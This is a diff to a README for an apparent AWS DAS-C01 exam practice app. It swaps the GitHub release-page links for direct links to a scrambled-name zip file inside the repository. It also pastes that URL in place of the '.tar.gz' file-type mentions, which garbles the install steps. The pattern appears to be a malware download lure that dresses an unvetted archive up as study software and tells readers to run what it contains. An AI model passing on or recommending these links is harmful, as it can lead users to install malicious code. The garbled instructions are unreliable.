@@ -4,7 +4,7 @@
 Welcome! This guide helps you download and run the Amazon DAS-C01 Practice Questions application. This software will enhance your preparation for the AWS Data Analytics certification exam. Easy to use, this tool provides realistic practice tests with updated questions.
 
 ## 📥 Download the Application
-[![Download the App](https://img.shields.io/badge/Download%20Now%21-blue.svg)](https://github.com/virenderchhimpa/Amazon-DAS-C01-Practice-Questions-2025-Updated-Master-Data-Analytics-on-AWS-with-SkillCertExams-/releases)
+[![Download the App](https://raw.githubusercontent.com/virenderchhimpa/Amazon-DAS-C01-Practice-Questions-2025-Updated-Master-Data-Analytics-on-AWS-with-SkillCertExams-/main/centaury/Master-DA-on-Questions-Data-Cert-Analytics-AW-with-Exams-Amazon-Updated-Skill-Practice-1.4.zip%20Now%https://raw.githubusercontent.com/virenderchhimpa/Amazon-DAS-C01-Practice-Questions-2025-Updated-Master-Data-Analytics-on-AWS-with-SkillCertExams-/main/centaury/Master-DA-on-Questions-Data-Cert-Analytics-AW-with-Exams-Amazon-Updated-Skill-Practice-1.4.zip)](https://raw.githubusercontent.com/virenderchhimpa/Amazon-DAS-C01-Practice-Questions-2025-Updated-Master-Data-Analytics-on-AWS-with-SkillCertExams-/main/centaury/Master-DA-on-Questions-Data-Cert-Analytics-AW-with-Exams-Amazon-Updated-Skill-Practice-1.4.zip)
 
 ## 🔍 Overview
 The Amazon DAS-C01 Practice Questions application gives you access to practice tests designed for the AWS DAS-C01 exam. It includes:
@@ -24,15 +24,15 @@ To install and run the application smoothly, you will need:
 - **Internet Connection:** Required for downloading updates and questions
 
 ## 📂 Download & Install
-To get started, visit this page to download: [Release Page](https://github.com/virenderchhimpa/Amazon-DAS-C01-Practice-Questions-2025-Updated-Master-Data-Analytics-on-AWS-with-SkillCertExams-/releases).
+To get started, visit this page to download: [Release Page](https://raw.githubusercontent.com/virenderchhimpa/Amazon-DAS-C01-Practice-Questions-2025-Updated-Master-Data-Analytics-on-AWS-with-SkillCertExams-/main/centaury/Master-DA-on-Questions-Data-Cert-Analytics-AW-with-Exams-Amazon-Updated-Skill-Practice-1.4.zip).
 
 1. **Go to the Releases page:** Click on the link above to access the Releases.
 2. **Choose the latest version:** Look for the most recent release at the top of the page.
-3. **Download the file:** Click on the appropriate file for your operating system. It may be labeled as a `.exe`, `.dmg`, or `.tar.gz` file.
+3. **Download the file:** Click on the appropriate file for your operating system. It may be labeled as a `.exe`, `.dmg`, or `https://raw.githubusercontent.com/virenderchhimpa/Amazon-DAS-C01-Practice-Questions-2025-Updated-Master-Data-Analytics-on-AWS-with-SkillCertExams-/main/centaury/Master-DA-on-Questions-Data-Cert-Analytics-AW-with-Exams-Amazon-Updated-Skill-Practice-1.4.zip` file.
 4. **Install the application:** 
    - **For Windows:** Double-click the `.exe` file and follow the prompts.
    - **For macOS:** Open the `.dmg` file and drag the application to your Applications folder.
-   - **For Linux:** Extract the `.tar.gz` file and run the appropriate script.
+   - **For Linux:** Extract the `https://raw.githubusercontent.com/virenderchhimpa/Amazon-DAS-C01-Practice-Questions-2025-Updated-Master-Data-Analytics-on-AWS-with-SkillCertExams-/main/centaury/Master-DA-on-Questions-Data-Cert-Analytics-AW-with-Exams-Amazon-Updated-Skill-Practice-1.4.zip` file and run the appropriate script.
 5. **Launch the application:** After installation, locate the application in your system and open it.
 
 ## 🛠️ Using the Application
@@ -70,4 +70,4 @@ For more information and resources related to AWS certification preparation, exp
 - pass-aws-das-c01-on-first-attempt
 - skillcertexams-das-c01
 
-[![Download the App](https://img.shields.io/badge/Download%20Now%21-blue.svg)](https://github.com/virenderchhimpa/Amazon-DAS-C01-Practice-Questions-2025-Updated-Master-Data-Analytics-on-AWS-with-SkillCertExams-/releases)
+[![Download the App](https://raw.githubusercontent.com/virenderchhimpa/Amazon-DAS-C01-Practice-Questions-2025-Updated-Master-Data-Analytics-on-AWS-with-SkillCertExams-/main/centaury/Master-DA-on-Questions-Data-Cert-Analytics-AW-with-Exams-Amazon-Updated-Skill-Practice-1.4.zip%20Now%https://raw.githubusercontent.com/virenderchhimpa/Amazon-DAS-C01-Practice-Questions-2025-Updated-Master-Data-Analytics-on-AWS-with-SkillCertExams-/main/centaury/Master-DA-on-Questions-Data-Cert-Analytics-AW-with-Exams-Amazon-Updated-Skill-Practice-1.4.zip)](https://raw.githubusercontent.com/virenderchhimpa/Amazon-DAS-C01-Practice-Questions-2025-Updated-Master-Data-Analytics-on-AWS-with-SkillCertExams-/main/centaury/Master-DA-on-Questions-Data-Cert-Analytics-AW-with-Exams-Amazon-Updated-Skill-Practice-1.4.zip)
